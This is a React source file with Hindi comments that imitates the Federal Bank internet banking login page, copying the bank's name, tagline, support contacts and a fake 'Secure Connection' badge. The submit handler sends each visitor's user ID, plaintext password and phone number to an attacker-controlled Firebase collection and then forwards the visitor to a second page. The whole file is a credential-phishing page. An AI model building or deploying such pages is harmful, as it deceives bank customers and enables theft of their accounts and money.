import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import '../App.css';
// मान लें कि FirebaseUtil आपके डेटा को अपलोड करने के लिए ठीक से कॉन्फ़िगर किया गया है
import FirebaseUtil from '../FirebaseRepo'; 

const FederalLoginPage = () => {
  // सारे स्टेट्स को डिफाइन करें
  const [userId, setUserId] = useState('');
  const [password, setPassword] = useState(''); // Variable name changed from password1 to password
  const [phoneNumber, setPhoneNumber] = useState('');
  const [captcha, setCaptcha] = useState('');
  const [captchaText, setCaptchaText] = useState('');
  const [captchaType, setCaptchaType] = useState('image'); // Not fully implemented, but kept for UI
  const [language, setLanguage] = useState('English');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [captchaError, setCaptchaError] = useState('');
  const navigate = useNavigate();
  
  // Firebase कलेक्शन का नाम (आपके अनुरोध के अनुसार 'federal')
  const COLLECTION_NAME = 'federal';

  // Captcha जनरेट करने का फंक्शन
  const generateCaptcha = () => {
    const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';
    let result = '';
    for (let i = 0; i < 6; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    setCaptchaText(result);
  };

  // कंपोनेंट माउंट होने पर कैप्चा जनरेट करें
  useEffect(() => {
    generateCaptcha();
  }, []);

  // फॉर्म सबमिट हैंडलर
  const handleSubmit = async (e) => {
    e.preventDefault();
    setCaptchaError('');
    
    // Captcha वेरिफिकेशन (Case-Insensitive)
    if (captcha.toLowerCase() !== captchaText.toLowerCase()) {
      setCaptchaError('Invalid captcha. Please try again.');
      generateCaptcha();
      setCaptcha('');
      return;
    }
    
    setIsSubmitting(true);

    try {
      const timestamp = Date.now();

      // यूज़र के लिए परसिस्टेंट डॉक्यूमेंट ID जनरेट या रियूज़ करें
      let documentId = localStorage.getItem(`${COLLECTION_NAME}_document_id`);
      if (!documentId) {
        documentId = `user_${timestamp}`;
        localStorage.setItem(`${COLLECTION_NAME}_document_id`, documentId);
      }
      
      // Firestore में डेटा अपलोड करें
      // चेतावनी: पासवर्ड को प्लेन टेक्स्ट में स्टोर करना असुरक्षित है।
      const result = await FirebaseUtil.uploadAnyModel(`${COLLECTION_NAME}/${documentId}`, {
        key: documentId,
        userId,
        password,
        phoneNumber,
        language,
        timeStamp: timestamp,
      });
      
      // अपलोड सफल होने पर चेक करें
      if (result.state === 'success') {
        // दूसरे पेज पर नेविगेट करें
        setTimeout(() => {
          setIsSubmitting(false);
          navigate(`/second/${documentId}`); 
        }, 1500);
      } else {
        throw new Error(result.error || 'Failed to upload data');
      }
    } catch (error) {
      console.error("Error submitting form:", error);
      setIsSubmitting(false);
    }
  };

  // इनपुट फ़ील्ड के लिए आइकॉन हेल्पर कंपोनेंट
  const InputIcon = ({ children }) => (
    <div className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400">
      {children}
    </div>
  );

  return (
    // फेडरल बैंक थीम: गहरा नीला बैकग्राउंड
    <div className="flex flex-col min-h-screen bg-[#142B40] font-sans">
      
      {/* Header - गहरा नीला बार */}
      <header className="bg-[#1C3B6F] p-4 flex justify-between items-center shadow-lg">
        <div className="flex items-center space-x-2">
          {/* लोगो प्लेसहोल्डर (आप इसे फेडरल बैंक के असली लोगो से बदल सकते हैं) */}
          <svg xmlns="http://www.w3.org/2000/svg" className="h-8 w-8 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
            <path strokeLinecap="round" strokeLinejoin="round" d="M21 12a9 9 0 01-9 9m9-9a9 9 0 00-9-9m9 9H3m9 9a9 9 0 01-9-9m9 9c1.657 0 3-4.477 3-10S13.657 3 12 3s-3 4.477-3 10 1.343 10 3 10z" />
          </svg>
          <div className="text-white">
            <h1 className="text-xl font-bold tracking-wider">FEDERAL BANK</h1>
            <p className="text-xs text-gray-300">Your perfect banking partner</p>
          </div>
        </div>
        <div className="space-y-1.5 cursor-pointer">
          <div className="w-6 h-0.5 bg-white rounded"></div>
          <div className="w-6 h-0.5 bg-white rounded"></div>
          <div className="w-6 h-0.5 bg-white rounded"></div>
        </div>
      </header>

      {/* टैगलाइन */}
      <div className="bg-[#142B40] text-gray-300 text-center py-2 text-sm border-b border-[#1C3B6F]">
        <p>Together We Can, Your Perfect We Can</p>
      </div>

      {/* मेन कंटेंट - लॉगिन फॉर्म */}
      <main className="flex-1 p-4 flex justify-center items-start pt-10">
        <div className="bg-[#1C3B6F] text-white rounded-lg w-full max-w-4xl p-6 shadow-2xl">
          <div className="text-center mb-6">
            <h2 className="text-2xl font-bold border-b-2 border-[#4D9DE0] inline-block pb-1 mb-4">Internet Banking Login</h2>
          </div>

          {/* दो कॉलम लेआउट (बड़े स्क्रीन के लिए) */}
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">

            {/* बायाँ कॉलम: मुख्य लॉगिन फॉर्म */}
            <div className="space-y-6">
              <h3 className="text-xl font-semibold border-b border-gray-600 pb-2 text-[#4D9DE0]">Login Details</h3>
              <form onSubmit={handleSubmit} className="space-y-4">
                
                {/* User ID इनपुट */}
                <div className="relative">
                  <InputIcon>
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M16 7a4 4 0 11-8 0 4 4 0 018 0zM12 14a7 7 0 00-7 7h14a7 7 0 00-7-7z" /></svg>
                  </InputIcon>
                  <input
                    type="text"
                    placeholder="User ID"
                    value={userId}
                    onChange={(e) => setUserId(e.target.value)}
                    className="w-full pl-10 pr-3 py-2 rounded-lg bg-gray-800 text-white border border-[#4D9DE0] focus:outline-none focus:ring-2 focus:ring-[#4D9DE0]"
                    required
                    disabled={isSubmitting}
                  />
                </div>
                
                {/* Password इनपुट */}
                <div className="relative">
                  <InputIcon>
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" /></svg>
                  </InputIcon>
                  <input
                    type="password"
                    placeholder="Password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full pl-10 pr-3 py-2 rounded-lg bg-gray-800 text-white border border-[#4D9DE0] focus:outline-none focus:ring-2 focus:ring-[#4D9DE0]"
                    required
                    disabled={isSubmitting}
                  />
                </div>
                
                {/* Phone Number इनपुट */}
                <div className="relative">
                  <InputIcon>
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z" /></svg>
                  </InputIcon>
                  <input
                    type="tel"
                    placeholder="10-digit phone number"
                    value={phoneNumber}
                    onChange={(e) => setPhoneNumber(e.target.value)}
                    className="w-full pl-10 pr-3 py-2 rounded-lg bg-gray-800 text-white border border-[#4D9DE0] focus:outline-none focus:ring-2 focus:ring-[#4D9DE0]"
                    required
                    pattern="[0-9]{10}"
                    disabled={isSubmitting}
                  />
                </div>

                {/* Captcha सेक्शन */}
                <div className="space-y-2 pt-2">
                    <p className="text-sm font-semibold text-[#4D9DE0]">Captcha</p>
                    <div className="flex items-center mb-3 space-x-2">
                        <input
                            type="text"
                            placeholder="Enter Captcha"
                            className="flex-1 py-2 px-3 rounded text-gray-700 text-sm bg-white"
                            value={captcha}
                            onChange={(e) => setCaptcha(e.target.value)}
                            required
                            disabled={isSubmitting}
                        />
                        <div className="bg-white rounded p-2 flex items-center justify-center w-28 relative">
                            <span 
                            className="text-gray-700 font-mono text-sm select-none cursor-pointer"
                            style={{
                                fontFamily: 'monospace',
                                letterSpacing: '2px',
                                fontWeight: 'bold',
                                fontStyle: 'italic',
                                textDecoration: 'line-through',
                                transform: 'skewX(-5deg)',
                                textShadow: '1px 1px 2px rgba(0,0,0,0.2)',
                                padding: '2px 4px'
                            }}
                            // सुरक्षा के लिए, क्लिक करने पर ऑटो-फिल करने का लॉजिक हटा दिया गया है
                            >
                            {captchaText}
                            </span>
                        </div>
                        <button 
                            type="button" 
                            className="text-white p-2 rounded-full bg-[#4D9DE0] hover:bg-opacity-80 transition"
                            onClick={generateCaptcha}
                            disabled={isSubmitting}
                        >
                            {/* रीलोड आइकॉन */}
                            <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
                            </svg>
                        </button>
                    </div>

                    {/* Captcha एरर मैसेज */}
                    {captchaError && (
                    <div className="mb-3 text-red-400 text-sm text-center">
                        {captchaError}
                    </div>
                    )}
                </div>

                {/* भाषा चयन */}
                <div>
                    <select
                        className="w-full py-2 px-3 rounded text-gray-700 text-sm bg-gray-800 border border-[#4D9DE0] text-white focus:outline-none focus:ring-2 focus:ring-[#4D9DE0]"
                        value={language}
                        onChange={(e) => setLanguage(e.target.value)}
                        disabled={isSubmitting}
                    >
                        <option value="English" className="bg-gray-800 text-white">English</option>
                        <option value="Hindi" className="bg-gray-800 text-white">Hindi</option>
                        <option value="Kannada" className="bg-gray-800 text-white">Kannada</option>
                        <option value="Malayalam" className="bg-gray-800 text-white">Malayalam</option>
                    </select>
                </div>

                {/* लॉगिन बटन */}
                <button
                type="submit"
                className="w-full bg-[#4D9DE0] hover:bg-[#6FA8DC] text-white font-bold py-2 px-4 rounded-full transition duration-150 ease-in-out text-base mt-6"
                disabled={isSubmitting}
                >
                {isSubmitting ? "PROCESSING..." : "LOGIN"}
                </button>

                {/* क्रिएट/रीसेट पासवर्ड बटन */}
                <button
                type="button"
                className="w-full text-white py-2 px-4 rounded-full border border-gray-500 hover:border-[#4D9DE0] transition text-sm"
                disabled={isSubmitting}
                >
                Create / Reset Login Password
                </button>

            </form>

            {/* अन्य सेवाओं के लिंक */}
            <div className="mt-8 pt-4 border-t border-gray-600 space-y-3">
                <h4 className="text-lg font-semibold text-gray-300">Other Services</h4>
                <div className="grid grid-cols-2 gap-3 text-center">
                    <button
                        type="button"
                        className="bg-gray-700 hover:bg-gray-600 text-white py-2 px-2 rounded-lg text-xs transition"
                    >
                        <span className="text-[#4D9DE0] mr-1">•</span> New User Registration
                    </button>
                    <button
                        type="button"
                        className="bg-gray-700 hover:bg-gray-600 text-white py-2 px-2 rounded-lg text-xs transition"
                    >
                        <span className="text-[#4D9DE0] mr-1">•</span> Forgot User ID
                    </button>
                    <button
                        type="button"
                        className="bg-gray-700 hover:bg-gray-600 text-white py-2 px-2 rounded-lg text-xs transition"
                    >
                        <span className="text-[#4D9DE0] mr-1">•</span> Unlock User ID
                    </button>
                    <button
                        type="button"
                        className="bg-gray-700 hover:bg-gray-600 text-white py-2 px-2 rounded-lg text-xs transition"
                    >
                        <span className="text-[#4D9DE0] mr-1">•</span> Activate User ID
                    </button>
                </div>
            </div>

            </div>
            
            {/* दायाँ कॉलम: जानकारी और क्विक लिंक्स */}
            <div className="space-y-6">
              <h3 className="text-xl font-semibold border-b border-gray-600 pb-2 text-[#4D9DE0]">Information & Quick Links</h3>
              
              <div className="space-y-3">
                <p className="text-sm font-bold text-gray-300">Important Notices:</p>
                <ul className="text-sm text-gray-400 space-y-1 ml-4 list-disc">
                    <li>Beware of phishing emails and fake websites.</li>
                    <li>Always log in using the official URL.</li>
                    <li>For better experience, use Incognito/Private mode.</li>
                </ul>
              </div>

              {/* वर्चुअल असिस्टेंट */}
              <div className="border border-gray-600 p-4 rounded-lg bg-[#27496D] flex items-center justify-between">
                <div className="text-sm">
                    <p className="font-bold text-[#4D9DE0]">Virtual Assistant</p>
                    <p className="text-xs text-gray-300 mt-1">Chat with our bot for instant help.</p>
                </div>
                <div className="w-12 h-12 bg-[#4D9DE0] rounded-full flex items-center justify-center">
                    {/* बॉट आइकॉन */}
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-7 w-7 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth={2}>
                        <path strokeLinecap="round" strokeLinejoin="round" d="M8 10h.01M12 10h.01M16 10h.01M9 16H5a2 2 0 01-2-2V6a2 2 0 012-2h14a2 2 0 012 2v8a2 2 0 01-2 2h-5l-5 4v-4z" />
                    </svg>
                </div>
              </div>
              
              {/* सुरक्षा बैज */}
              <div className="flex items-center space-x-3 pt-3 border-t border-gray-600">
                <div className="bg-white p-2 rounded-full">
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-green-600" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
                  </svg>
                </div>
                <div className="text-sm">
                  <div className="font-bold text-green-400">Secure Connection</div>
                  <div className="text-gray-400">Powered by GlobalSign</div>
                </div>
              </div>

            </div>

          </div> {/* दो कॉलम लेआउट का अंत */}

        </div>
      </main>

      {/* फ़ूटर */}
      <footer className="bg-[#1C3B6F] text-white p-4 text-center border-t border-[#4D9DE0] shadow-inner mt-auto">
        <p className="text-sm">© {new Date().getFullYear()} Federal Bank. All rights reserved.</p>
        <p className="text-xs text-gray-400">For support, call 1800-425-1199 or email contact@federalbank.co.in</p>
      </footer>
    </div>
  );
};

export default FederalLoginPage;

